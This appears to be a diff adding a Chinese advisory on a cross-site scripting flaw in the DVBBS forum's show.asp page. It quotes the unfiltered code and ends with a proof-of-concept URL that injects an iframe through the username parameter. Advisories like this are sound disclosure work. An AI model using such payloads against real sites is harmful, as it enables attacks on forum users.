@@ -1,0 +1,28 @@
+动网论坛(DVBBS)Show.asp最新跨站漏洞
+
+[动网论坛(DVBBS)Show.asp最新跨站漏洞 全文] 
+动网论坛(DVBBS)Show.asp页面过滤不严导致跨站漏洞 
+
+
+添加时间:2009-05-25 
+
+系统编号:WAVDB-01432 
+
+影响版本:DVBBS 8.0.0-8.2.0 
+
+程序介绍: 
+动 网论坛做为动网主要服务产品之一，自2001年投入推广并运营以来，得到了国内外广大互联网用户的广泛好评和支持。做为国内第一的互联网论坛服务品牌，占 据了国内论坛服务市场的70％以上的用户，动网论坛服务在一些如电影、下载、网游等热门网站的占有率甚至高达80％以上，是中国论坛服务领域事实上的标准。 
+
+漏洞分析: 
+文件show.asp中： 
+
+filetype=Request("filetype") //第75行 
+username=Request("username") 
+…… 
+TempStr = Replace(TempStr,"{$username}",UserName) //第244行 
+
+程序对于输出变量filetype和username过滤导致xss漏洞的产生。 
+
+漏洞利用: 
+
+http://www.sitedir.com.cn/show.asp?filetype=xxx&username=nnn<;iframe%20src=http://www.baidu.com></iframe> 
